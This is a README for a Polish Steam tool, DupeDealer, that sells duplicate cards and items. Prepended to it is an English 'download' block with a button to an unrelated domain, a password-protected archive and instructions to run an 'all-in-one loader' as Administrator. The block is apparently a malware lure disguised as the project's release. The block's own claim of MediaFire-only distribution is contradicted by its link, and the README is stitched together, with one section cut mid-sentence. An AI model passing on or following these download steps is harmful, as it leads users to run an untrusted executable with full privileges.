<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

# 🏷️ DupeDealer

**Wystawia duplikaty kart i przedmiotów Steam na rynku — zawsze zostawiając po jednej sztuce każdego rodzaju.**

Aplikacja okienkowa na Windows i skrypt CLI. Bez przeglądarki, na czystym `requests`.

## Co to robi

Masz w ekwipunku Steam dziesiątki powtórzonych kart? Ten program grupuje przedmioty po
`market_hash_name`, **zostawia po jednej sztuce każdego rodzaju**, a resztę wystawia na rynku
po cenie wyliczonej z aktualnych ofert. Oferty **potwierdzasz sam** w apce Steam Mobile —
bot nigdy nie robi tego za Ciebie.

**Przebieg:**

1. Logujesz się (push do apki Steam albo kod QR) — bez ręcznego wklejania ciasteczek.
2. Wczytujesz ekwipunek i widzisz tabelę duplikatów z ceną rynku i kwotą „dostajesz".
3. Zaznaczasz, co wystawić, robisz podgląd (dry-run) albo realnie wystawiasz.
4. Wchodzisz do apki Steam Mobile → **Potwierdzenia → Zatwierdź wszystko**.

## Funkcje

- ✅ **Bezpieczna logika** — zawsze zostawia 1 sztukę rodzaju, wystawia tylko nadmiar.
- 🖥️ **Nowoczesne GUI** (PySide6, ciemny motyw): sortowalna tabela z checkboxami, wycena
  w tle z paskiem postępu, podgląd i wystawianie z potwierdzeniem.
- 👤 **Panel konta po zalogowaniu** — awatar profilu i saldo portfela Steam w nagłówku.
- 🖼️ **Grafika przedmiotu** — miniatura w tabeli, a po najechaniu pełnowymiarowy obraz w dymku.
- 🔐 **Logowanie bez ciasteczek** — push do apki albo kod QR; sesja odtwarzana po cichu
  z refresh tokenu (ważny wiele miesięcy).
- 🎮 **Wiele ekwipunków** — karty (753/6), TF2 (440/2), CS2 (730/2), Dota 2 (570/2) + filtr typów.
- ⚡ **Wycena hurtem — cała lista jednym zapytaniem** (domyślna). Omija limit rynku Steam,
  który po kilkudziesięciu zapytaniach blokuje adres IP na godziny.
- 💰 **Wycena rynkowa** (`priceoverview`, najniższa oferta sprzedaży) do wyboru — dokładniejsza,
  ale jedno zapytanie na pozycję. Obie z odjęciem prowizji Steam (~15%) i opcją *undercut*.
- 💾 **Ceny zapamiętywane na dobę** — kolejne uruchomienia prawie nie pytają Steama.
- 🧹 **Usuń moje dane** — jeden przycisk kasuje z komputera wszystko, co program zapisał
  (logowanie, cache cen, raport diagnostyczny).
- 🦊 **Wersja przeglądarkowa (userscript)** — wystawianie duplikatów wprost z Firefoksa/Chrome,
  w zalogowanej sesji, bez instalowania apki (`steam_autosell.user.js`); ekwipunek, typy
  i konkretne pozycje wybierasz klikając w panelu.
- 🧪 **Ten sam silnik w CLI** — dobry do crona; wbudowany `--selftest`.

---

## Uruchomienie ze źródeł

Działa tak samo na Windows i Linux:

```bash
python -m venv venv
venv/bin/pip install -r requirements.txt        # Windows: venv\Scripts\pip
venv/bin/python dupedealer_gui.py             # Windows: venv\Scripts\python
```

### Zbudowanie własnego `.exe`

Na Windowsie z Pythonem 3.10+ w PATH wystarczy:

```bat
build.bat
```

Wynik: `dist\DupeDealer.exe` (jeden plik, bez konsoli). Ręczny odpowiednik:

```bat
pyinstaller --onefile --windowed --icon app.ico --name DupeDealer ^
    --add-data "app.ico;." --collect-submodules steam.protobufs dupedealer_gui.py
```

Wersje release'owe buduje GitHub Actions (`.github/workflows/release.yml`) po pushu taga `v*`.

> **Dlaczego `--collect-submodules steam.protobufs`?** Pakiet `steam` ładuje protobufy
> dynamicznie — bez tego w gotowym `.exe` zabraknie `steammessages_auth_pb2` i logowanie
> się wysypie. Zostaw też pin **`protobuf==3.20.3`** (nowszy nie ma `google.protobuf.service`,
> którego wymagają wygenerowane `*_pb2`).

---

## Wystawianie z przeglądarki (userscript)

Nie chcesz stawiać apki? Ten sam efekt masz z poziomu przeglądarki. Skrypt
## Wariant CLI

**Domyślnie dry-run** — realnie wystawia dopiero z `--sell`.

```bash
python dupedealer.py            # podgląd: co i za ile by wystawił
python dupedealer.py --sell     # realne wystawienie duplikatów
```

| Flaga | Domyślnie | Opis |
|-------|-----------|------|
| `--sell` | off (dry-run) | realnie wystaw oferty |
| `--app` | `753/6` | `appid/contextid`: `753/6`=karty, `440/2`=TF2, `730/2`=CS2, `570/2`=Dota2 |
| `--types` | `Trading Card` | typy po przecinku; **puste `''` = wszystkie marketable duplikaty** |
| `--currency` | `6` | waluta wyceny: `6`=PLN, `3`=EUR, `1`=USD |
| `--undercut` | `0` | o ile groszy zejść poniżej ceny kupującego |
| `--delay` | `3.5` | przerwa między żądaniami (s) — dotyczy tylko `--market-price` |
| `--market-price` | off | wycena rynkowa (1 zapytanie/pozycję); domyślnie hurtem (1 zapytanie na całą listę) |
| `--noninteractive` | off | tryb cron: gdy logowanie wygasło → wyjście (opcjonalny alert Telegram) |
| `--selftest` | — | testy jednostkowe wyceny/parsera i wyjście |

Logowanie z linii poleceń: `python steam_auth.py --login` (push) lub `--qr` (kod do zeskanowania).

Przykład crona (tygodniowo, bez blokowania na logowanie):

```cron
0 12 * * 0 cd ~/DupeDealer && venv/bin/python dupedealer.py --sell --noninteractive
```

## Konfiguracja (zmienne środowiskowe)

Wszystko jest opcjonalne — w GUI dane logowania wpisujesz w okienku.

| Zmienna | Rola |
|---------|------|
| `STEAM_LOGIN`, `STEAM_PASSWORD` | dane do logowania `--login` (dla CLI/crona) |
| `STEAM_TOKEN_FILE` | ścieżka pliku refresh tokenu (dom. `~/.steam_refresh_token`; Windows GUI: `%APPDATA%\DupeDealer\`) |
| `STEAM_SECRETS_FILE` | opcjonalny plik `KEY=VALUE` z powyższymi sekretami |
| `TG_TOKEN`, `TG_CHAT_ID` | opcjonalne powiadomienia Telegram (bez nich po prostu pomijane) |

## Jak liczona jest cena

Dostępne są dwa źródła cen:

| Źródło | Co zwraca | Koszt |
|--------|-----------|-------|
| **Hurtem** (domyślne) | najwyższą ofertę kupna — sprzedaż od ręki, zwykle nieco niżej | **1 zapytanie na całą listę** |
| **Rynkowa** | najniższą ofertę sprzedaży (`priceoverview`) — dokładniejsza, wyżej | 1 zapytanie na pozycję |

Funkcja `buyer_price_to_receive()` odejmuje **prowizję Steam (~15%**, min. 1 gr dla Steam
+ 1 gr dla twórcy gry), by wyliczyć kwotę, jaką masz *dostać*, żeby kupujący zapłacił nie
więcej niż cena odniesienia. Z opcją *undercut* schodzisz jeszcze o kilka groszy poniżej.

Ceny lądują w `prices.json` obok tokenu i są ważne **dobę**, osobno dla każdego źródła
i waluty (oferty kupna i oferty sprzedaży to różne kwoty — nie wolno ich mieszać).

## Gdzie program trzyma dane

Wszystko ląduje w jednym katalogu — `%APPDATA%\DupeDealer` (Windows) albo `~/.dupedealer`:

| Plik | Co to |
|------|-------|
| `refresh_token` | zapamiętane logowanie do Steama |
| `prices.json` | cache cen (ważny dobę) |
| `dupedealer-diag.txt` | raport z ostatniej odmowy wyceny, jeśli wystąpiła |

Przycisk **Usuń moje dane** w nagłówku kasuje te pliki i sam katalog, po potwierdzeniu.
Program nie zostawia nic poza tym katalogiem — nie pisze do rejestru ani nie instaluje się
w systemie, więc po wyczyszczeniu danych wystarczy skasować `.exe`. Twoje przedmioty
i wystawione oferty na Steamie pozostają oczywiście nietknięte.

## Bezpieczeństwo

- Refresh token i wszelkie sekrety **nie trafiają do repozytorium** (`.gitignore`) ani do
  interfejsu czy logów.
- Hasło w GUI żyje tylko w pamięci na czas logowania — nie jest zapisywane na dysk;
  trwale trzymany jest wyłącznie refresh token (na Windowsie w `%APPDATA%`).
- Bot **nie ma** `identity_secret` / sekretów 2FA, więc nie potwierdza ofert automatycznie —
  każdą zatwierdzasz ręcznie w apce Steam Mobile.

## Uwagi techniczne

Dla osób zaglądających w kod / rozwijających projekt:

- Endpoint ekwipunku wymaga nagłówka **`Referer`** i `count` **≤ 2000** (5000 → HTTP 400).
- `priceoverview` jest ostro rate-limitowane: po przekroczeniu limitu Steam **banuje adres IP
  na ok. 6 godzin**, a ban liczy się od *ostatniej próby*, nie od ostatniego udanego użycia —
  ponawianie potrafi utrzymywać go w nieskończoność. Stąd wycena hurtem jako domyślna,
  cache na dysku i odstęp (`--delay` / suwak *Odstęp*) dla trybu rynkowego.
- Wycena hurtem czyta stronę `market/multisell`. Nazwy i ceny są w niej powiązane wyłącznie
  kolejnością (`data-assetid` w wierszu to identyfikator rynkowy, nie ten z ekwipunku), więc
  parser sprawdza zgodność obu list i przy jakiejkolwiek rozbieżności **nie zwraca nic** —
  zgadywanie przesuniętych cen wystawiłoby karty po cudzych kwotach.
- Logowanie: `GetPasswordRSAPublicKey` to **GET**, reszta `Begin*/Poll*` to POST;
  `platform_type = WebBrowser (2)`, `os_type = -500`; sesja web idzie przez `finalizelogin`.
- Kod QR rysuje własny `tiny_qr.py` (zero zależności), zweryfikowany bit-w-bit z referencyjnym
  enkoderem.


---

MIT License

Copyright (c) 2026 Piotr Kajor

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
